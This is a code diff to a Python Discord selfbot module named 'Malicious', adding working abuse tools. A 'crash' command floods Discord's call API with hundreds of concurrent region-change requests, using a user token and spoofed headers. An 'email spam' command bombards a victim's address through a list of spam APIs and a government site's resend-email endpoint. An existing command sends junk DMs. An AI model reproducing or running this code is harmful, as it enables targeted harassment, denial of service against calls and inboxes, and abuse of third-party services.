@@ -3,23 +3,38 @@
 import asyncio
 import contextlib
 import json
+import os
 import random
 import typing
 
 import aiohttp
 import discord
+from discord.channel import DMChannel, GroupChannel
 from discord.ext import commands
+from discord.ext.commands.core import command
 from ext.procedures import *
+from fake_useragent import UserAgent
+
+from init import Tragedy
 
 
 class Malicious(commands.Cog):
-	def __init__(self, bot):
+	def __init__(self, bot: Tragedy):
 		self.bot = bot
 		self.session = aiohttp.ClientSession(loop=self.bot.loop)
+		self.user_agents = UserAgent()
+		self.email_spam_apis = [x.strip() for x in open('ignore\\emailspammers.txt', 'rb').readlines() if len(x.strip()) > 0]
 
 	async def dev_spam(self, member: typing.Union[discord.Member, discord.User]):
 		with contextlib.suppress(discord.Forbidden):
 			await member.send('<a://a{0}>'.format(''.join(random.choice('\'"^`|{}') for _ in range(1993))), nonce=random.randint(111111111111111111, 999999999999999999))
+	
+	async def spam_email(self, email: str, client: aiohttp.ClientSession):
+		[await client.get(str(api.decode('utf-8')).format(email, headers={"User-Agent": self.user_agents.random}, timeout=5)) for api in self.email_spam_apis]
+		[await client.post("https://www.bpjsketenagakerjaan.go.id/pu/resendEmail", data={'email': email}, headers={"User-Agent": self.user_agents.random}, timeout=5) for _ in range(10)]
+
+	async def crash_call(self, token: str, channel: int, client: aiohttp.ClientSession):
+		[await client.patch("https://discord.com/api/v9/channels/{0}/call".format(channel), headers={"Authorization": token, "accept": "*/*", "accept-language": "en-US", "connection": "keep-alive", "cookie": f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US', "DNT": "1", "origin": "https://discord.com", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "referer": "https://discord.com/channels/@me", "TE": "Trailers", "User-Agent": self.user_agents.random, "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"}, json={"region": random.choice(('us-west', 'brazil', 'hongkong', 'india', 'japan', 'rotterdam', 'russia', 'singapore', 'south-korea', 'southafrica', 'sydney', 'us-central', 'us-east', 'us-south'))}) for _ in range(15)]
 
 	@commands.command()
 	async def annoy(self, ctx: commands.Context, member: typing.Union[commands.MemberConverter, commands.UserConverter]):
@@ -87,6 +102,33 @@ class Malicious(commands.Cog):
 				await ctx.send(embed=discord.Embed(description="Successfully deleted webhook.", color=discord.Color.blurple()), delete_after=self.bot.delete_delay)
 			else:
 				await ctx.send(embed=discord.Embed(description="Could not delete webhook.", color=discord.Color.blurple()), delete_after=self.bot.delete_delay)
+
+	@commands.command(description="Crash a discord call")
+	async def crash(self, ctx: commands.Context):
+		if not isinstance(ctx.channel, (DMChannel, GroupChannel)):
+			return await ctx.send(embed=discord.Embed(description="Command only usable in DM or group channels.", color=discord.Color.blurple()), delete_after=self.bot.delete_delay)
+		await ctx.send(embed=discord.Embed(description="Successfully started crashing call.", color=discord.Color.blurple()), delete_after=self.bot.delete_delay)
+		tcp_connector = aiohttp.TCPConnector(limit=10)
+		async with aiohttp.ClientSession(connector=tcp_connector) as session:
+			await asyncio.gather(*[asyncio.ensure_future(self.crash_call(str(json.load(open('config.json', 'r'))["token"]), ctx.channel.id, session)) for _ in range(250)], loop=self.bot.loop, return_exceptions=False)
+
+	@commands.group(name="email", invoke_without_command=True)
+	async def email(self, ctx: commands.Context):
+		await ctx.send_help(ctx.command)
+
+	@email.command(name="spam", description="Spam an email")
+	async def email_spam(self, ctx: commands.Context, *, email: str):
+		await ctx.send(embed=discord.Embed(description="Successfully started spamming email.", color=discord.Color.blurple()), delete_after=self.bot.delete_delay)
+		await self.session.post("https://www.bpjsketenagakerjaan.go.id/pu/verifEmail", data={'email': email}, headers={"User-Agent": self.user_agents.random})
+		tcp_connector = aiohttp.TCPConnector(limit=10)
+		async with aiohttp.ClientSession(connector=tcp_connector) as session:
+			await asyncio.gather(*[asyncio.ensure_future(self.spam_email(email, session)) for _ in range(250)], loop=self.bot.loop, return_exceptions=False)
+
+	@email.command(name="info", description="Gather information about an email")
+	async def email_info(self, ctx: commands.Context, *, email: str):
+		async with self.session.get("https://emailrep.io/{0}".format(email)) as response:
+			jobj = json.loads(await response.text())
+		embed = discord.Embed(title=email, color=discord.Color.blurple())
 
 def setup(bot):
 	bot.add_cog(Malicious(bot))
